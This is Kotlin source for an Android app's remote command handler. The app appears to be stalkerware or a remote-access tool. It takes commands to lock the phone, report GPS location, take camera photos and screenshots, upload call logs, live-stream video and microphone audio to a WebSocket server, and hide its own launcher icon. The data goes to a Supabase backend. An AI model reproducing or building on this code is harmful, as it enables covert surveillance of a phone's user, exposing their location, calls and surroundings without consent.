package com.lokme.service

import android.app.AlertDialog
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.lokme.admin.DeviceAdminReceiver
import com.lokme.calllog.CallLogReader
import com.lokme.camera.AudioStreamHelper
import com.lokme.camera.CameraHelper
import com.lokme.camera.VideoStreamHelper
import com.lokme.location.LocationHelper
import com.lokme.network.SupabaseClient
import com.lokme.network.WsClient
import com.lokme.screen.ScreenCaptureHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class CommandExecutor(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var cameraHelper: CameraHelper? = null
    var videoStreamHelper: VideoStreamHelper? = null
        private set
    var audioStreamHelper: AudioStreamHelper? = null
        private set

    fun initCamera(lifecycleOwner: androidx.lifecycle.LifecycleOwner) {
        try {
            Thread {
                try {
                    val helper = CameraHelper(context, lifecycleOwner)
                    helper.initialize()
                    cameraHelper = helper

                    val streamHelper = VideoStreamHelper(context, lifecycleOwner)
                    streamHelper.initialize()
                    videoStreamHelper = streamHelper

                    val audioHelper = AudioStreamHelper(context)
                    audioStreamHelper = audioHelper

                    Log.d("CommandExec", "Camera + VideoStream + AudioStream initialized")
                } catch (e: Exception) {
                    Log.e("CommandExec", "Camera init failed: ${e.message}")
                }
            }.start()
        } catch (e: Exception) {
            Log.e("CommandExec", "initCamera error: ${e.message}")
        }
    }

    fun execute(
        commandType: String,
        commandId: String,
        payload: String,
        deviceId: String,
        wsClient: WsClient,
        onSuccess: (String) -> Unit,
        onError: (String) -> Unit
    ) {
        Log.d("CommandExec", "Executing: $commandType")

        when (commandType) {
            "LOCK_DEVICE" -> lockDevice(commandId, deviceId, onSuccess, onError)
            "SHOW_DIALOG" -> showDialog(commandId, deviceId, payload, onSuccess, onError)
            "GET_LOCATION" -> getLocation(commandId, deviceId, onSuccess, onError)
            "CAPTURE_PHOTO" -> capturePhoto(commandId, deviceId, payload, onSuccess, onError)
            "CAPTURE_SCREEN" -> captureScreen(commandId, deviceId, onSuccess, onError)
            "GET_CALL_LOG" -> getCallLog(commandId, deviceId, onSuccess, onError)
            "START_VIDEO_STREAM" -> startVideoStream(commandId, deviceId, payload, wsClient, onSuccess, onError)
            "STOP_VIDEO_STREAM" -> stopVideoStream(commandId, deviceId, onSuccess, onError)
            "HIDE_APP" -> hideApp(commandId, deviceId, onSuccess, onError)
            "SHOW_APP" -> showApp(commandId, deviceId, onSuccess, onError)
            else -> onError("Unknown command: $commandType")
        }
    }

    private fun lockDevice(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager

            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
                onSuccess("Device locked")
            } else {
                onError("Device admin not active")
            }
        } catch (e: Exception) {
            onError(e.message ?: "Lock failed")
        }
    }

    private fun showDialog(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val json = JSONObject(payload)
            val title = json.optString("title", "Message")
            val message = json.optString("message", "")

            handler.post {
                try {
                    val builder = AlertDialog.Builder(context, android.R.style.Theme_DeviceDefault_Dialog_Alert)
                        .setTitle(title)
                        .setMessage(message)
                        .setCancelable(false)
                        .setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }

                    val dialog = builder.create()
                    dialog.window?.setType(android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)
                    dialog.show()
                } catch (e: Exception) {
                    Log.e("CommandExec", "Dialog show error: ${e.message}")
                }
            }

            onSuccess("Dialog shown")
        } catch (e: Exception) {
            onError(e.message ?: "Dialog failed")
        }
    }

    private fun getLocation(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        LocationHelper.getCurrentLocation(
            context,
            onResult = { latLng ->
                scope.launch {
                    try {
                        SupabaseClient.insertLocation(deviceId, latLng.latitude, latLng.longitude)
                        onSuccess("${latLng.latitude},${latLng.longitude}")
                    } catch (e: Exception) {
                        onError(e.message ?: "Upload failed")
                    }
                }
            },
            onError = { e ->
                onError(e.message ?: "Location failed")
            }
        )
    }

    private fun capturePhoto(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
        val useFront = json.optBoolean("front_camera", false)
        val cameraType = if (useFront) "front" else "back"

        val helper = cameraHelper
        if (helper == null) {
            onError("Camera not initialized")
            return
        }

        helper.capturePhoto(
            useFrontCamera = useFront,
            onResult = { bytes ->
                scope.launch {
                    try {
                        val fileName = helper.generateFileName()
                        val url = SupabaseClient.uploadPhoto(deviceId, fileName, bytes)
                        SupabaseClient.insertPhotoRecord(deviceId, url, cameraType)
                        onSuccess(url)
                    } catch (e: Exception) {
                        onError(e.message ?: "Upload failed")
                    }
                }
            },
            onError = { e ->
                onError(e.message ?: "Capture failed")
            }
        )
    }

    private fun startVideoStream(commandId: String, deviceId: String, payload: String, wsClient: WsClient, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        val helper = videoStreamHelper
        if (helper == null) {
            onError("Video stream not initialized")
            return
        }

        val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
        val useFront = json.optBoolean("front_camera", false)

        helper.startStream(wsClient, deviceId, useFront)

        audioStreamHelper?.startStream(wsClient, deviceId)

        onSuccess("Video + audio stream started (${if (useFront) "front" else "back"} camera)")
    }

    private fun stopVideoStream(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        val helper = videoStreamHelper
        if (helper == null) {
            onError("Video stream not initialized")
            return
        }

        helper.stopStream()
        audioStreamHelper?.stopStream()
        onSuccess("Video + audio stream stopped")
    }

    private fun hideApp(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val pm = context.packageManager
            val componentName = ComponentName(context, "com.lokme.MainActivity")
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            onSuccess("App hidden from launcher")
        } catch (e: Exception) {
            onError(e.message ?: "Hide failed")
        }
    }

    private fun showApp(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val pm = context.packageManager
            val componentName = ComponentName(context, "com.lokme.MainActivity")
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            onSuccess("App shown in launcher")
        } catch (e: Exception) {
            onError(e.message ?: "Show failed")
        }
    }

    private fun getCallLog(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val logs = CallLogReader.readCallLogs(context, limit = 50)

            scope.launch {
                try {
                    val entries = logs.map { log ->
                        com.lokme.model.CallLogEntry(
                            device_id = deviceId,
                            phone_number = log.phoneNumber,
                            contact_name = log.contactName,
                            call_type = log.callType,
                            call_date = log.callDate,
                            duration_seconds = log.durationSeconds
                        )
                    }
                    SupabaseClient.insertCallLogs(entries)
                    onSuccess("Uploaded ${logs.size} call logs")
                } catch (e: Exception) {
                    onError(e.message ?: "Upload failed")
                }
            }
        } catch (e: Exception) {
            onError(e.message ?: "Read failed")
        }
    }

    private fun captureScreen(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val bytes = ScreenCaptureHelper.captureScreen()
            if (bytes == null) {
                onError("Screen capture failed (grant MediaProjection permission on device)")
                return
            }

            scope.launch {
                try {
                    val url = SupabaseClient.uploadPhoto(deviceId, "screen_${System.currentTimeMillis()}.jpg", bytes)
                    SupabaseClient.insertPhotoRecord(deviceId, url, "screen")
                    onSuccess(url)
                } catch (e: Exception) {
                    onError(e.message ?: "Upload failed")
                }
            }
        } catch (e: Exception) {
            onError(e.message ?: "Screen capture error")
        }
    }
}
